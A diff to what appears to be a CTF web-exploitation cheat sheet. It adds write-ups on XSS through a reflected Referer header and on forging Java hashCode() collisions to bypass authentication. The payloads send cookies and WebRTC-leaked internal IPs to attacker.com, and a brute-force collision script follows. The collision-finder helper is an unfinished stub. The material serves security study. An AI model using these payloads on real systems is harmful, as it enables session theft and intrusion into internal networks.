@@ -16,6 +16,8 @@ Unicode bypass, CSS-only exfiltration, behavioral JS frameworks, timing oracles,
 - [Cross-Origin XSS via Shared Parent Domain Cookie Injection (0CTF 2017)](#cross-origin-xss-via-shared-parent-domain-cookie-injection-0ctf-2017)
 - [Chrome Unicode URL Normalization Bypass (RCTF 2017)](#chrome-unicode-url-normalization-bypass-rctf-2017)
 - [XSS Dot-Filter Bypass via Decimal IP and Bracket Notation (33C3 CTF 2016)](#xss-dot-filter-bypass-via-decimal-ip-and-bracket-notation-33c3-ctf-2016)
+- [XSS via Referer Header Injection (Tokyo Westerns 2017)](#xss-via-referer-header-injection-tokyo-westerns-2017)
+- [Java hashCode() Collision for Auth Bypass (CSAW 2017)](#java-hashcode-collision-for-auth-bypass-csaw-2017)
 
 ---
 
@@ -376,3 +378,133 @@ url = "http://e\uff58ample.com/payload"
 ```
 
 **Key insight:** Decimal IP addresses are valid in URLs and contain no dots. Combined with JavaScript's bracket notation (which uses string keys instead of dot access), this bypasses any filter that targets the dot character.
+
+---
+
+## XSS via Referer Header Injection (Tokyo Westerns 2017)
+
+**Pattern:** The HTTP `Referer` header is reflected into a `<meta http-equiv="refresh">` tag (or other HTML context) without sanitization, enabling XSS. Combined with WebRTC ICE candidate leakage, this enables discovery of the server's internal IP for subsequent SSRF to localhost-restricted endpoints.
+
+```html
+<!-- Vulnerable page template — Referer header reflected verbatim: -->
+<meta http-equiv="refresh" content="0; url=REFERER_VALUE">
+
+<!-- Inject XSS by sending a crafted Referer: -->
+<!-- Referer: javascript:alert(document.cookie) -->
+<!-- Produces: <meta http-equiv="refresh" content="0; url=javascript:alert(document.cookie)"> -->
+```
+
+```python
+import requests
+
+TARGET = "http://target/page"
+
+# Step 1: XSS via Referer in meta refresh context
+xss_payload = "javascript:fetch('https://attacker.com/?c='+document.cookie)"
+r = requests.get(TARGET, headers={"Referer": xss_payload})
+# If target reflects Referer into meta refresh, victim browser executes the JS
+```
+
+**Combining with WebRTC internal IP leak:**
+```javascript
+// WebRTC ICE candidates leak internal IPs without user interaction
+// Inject this payload to discover internal network topology
+var pc = new RTCPeerConnection({
+    iceServers: [{urls: "stun:stun.l.google.com:19302"}]
+});
+pc.createDataChannel("");
+pc.createOffer().then(o => pc.setLocalDescription(o));
+pc.onicecandidate = function(ice) {
+    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+    // Candidate string contains internal IP: "192.168.x.x" or "10.x.x.x"
+    fetch('https://attacker.com/?ip=' + encodeURIComponent(ice.candidate.candidate));
+};
+```
+
+```bash
+# Full attack chain:
+# 1. Find page that reflects Referer without sanitization
+curl -v -H "Referer: test_marker" http://target/page 2>&1 | grep "test_marker"
+
+# 2. Inject XSS payload that runs WebRTC to leak internal IP
+# 3. Use leaked internal IP for SSRF to localhost:80 or internal services
+# e.g., http://192.168.1.1/admin — accessible only from internal network
+```
+
+**Key insight:** The `Referer` header is rarely sanitized because it's not considered "user input" in the traditional sense. When reflected into `<meta refresh>`, `<script>`, or URL attributes, it enables XSS. WebRTC `RTCPeerConnection` ICE candidates leak internal IPs without any user interaction or special permissions — useful for mapping internal networks after initial XSS.
+
+---
+
+## Java hashCode() Collision for Auth Bypass (CSAW 2017)
+
+**Pattern:** Java's `String.hashCode()` uses a 31-based polynomial rolling hash with 32-bit integer overflow. The small keyspace and simple structure make finding collisions trivial. When an application uses `hashCode()` for password comparison or token validation, forge a colliding string.
+
+```java
+// Java hashCode formula:
+// h = 0
+// for each char c: h = 31 * h + c  (with 32-bit overflow)
+
+// Vulnerable authentication:
+if (password.hashCode() == storedHash) {
+    grantAccess();   // WRONG: hashCode collisions trivially found
+}
+```
+
+```python
+def java_hashcode(s):
+    """Replicate Java's String.hashCode() in Python."""
+    h = 0
+    for c in s:
+        h = (31 * h + ord(c)) & 0xFFFFFFFF
+    # Handle Java's signed 32-bit integer behavior
+    if h >= 0x80000000:
+        h -= 0x100000000
+    return h
+
+# Verify: known collision pair
+target = "Pas$ion"
+assert java_hashcode("ParDJon") == java_hashcode(target)
+print(f"hashCode('ParDJon') = {java_hashcode('ParDJon')}")
+print(f"hashCode('Pas$ion') = {java_hashcode(target)}")
+# Both return the same value
+
+# Find collisions for an arbitrary target string:
+target_hash = java_hashcode("secretPassword")
+
+# Brute-force short strings:
+import itertools, string
+charset = string.printable.strip()
+for length in range(4, 9):
+    for candidate in itertools.product(charset, repeat=length):
+        s = ''.join(candidate)
+        if java_hashcode(s) == target_hash:
+            print(f"Collision found: '{s}'")
+            break
+```
+
+**Known collision pairs:**
+```text
+"Aa"   == "BB"        (hashCode = 2112)
+"AaBB" == "BBAa"      (longer collision)
+"ParDJon" == "Pas$ion"
+```
+
+**Systematic collision generation:**
+```python
+# For any two characters a, b where ord(a)*31 + ord(b) == ord(c)*31 + ord(d):
+# The strings ending in "ab" and "cd" will have the same hash contribution
+# Exploit: find char pairs with equal (31*h + ord(c)) mod 2^32
+
+# Quick collision finder for 2-char suffix:
+def find_collision(target_str):
+    target_h = java_hashcode(target_str)
+    for c1 in range(32, 127):
+        for c2 in range(32, 127):
+            candidate = target_str[:-1] + chr(c1) + chr(c2)
+            # ... adjust prefix to match hash
+    pass
+```
+
+**Key insight:** Java `hashCode()` produces trivial collisions due to its simple polynomial structure and 32-bit overflow. Never use it for security-sensitive comparisons (passwords, tokens, signatures). The collision space is dense — for most hash values, many short colliding strings exist. Use `hashCode()` only for hash table bucket assignment, never for equality/authentication checks.
+
+**Detection:** Java source using `password.hashCode() == storedHash`, token comparison via `token.hashCode()`, or any security check using `.hashCode()` instead of `equals()` with a secure hash (bcrypt, PBKDF2, etc.).
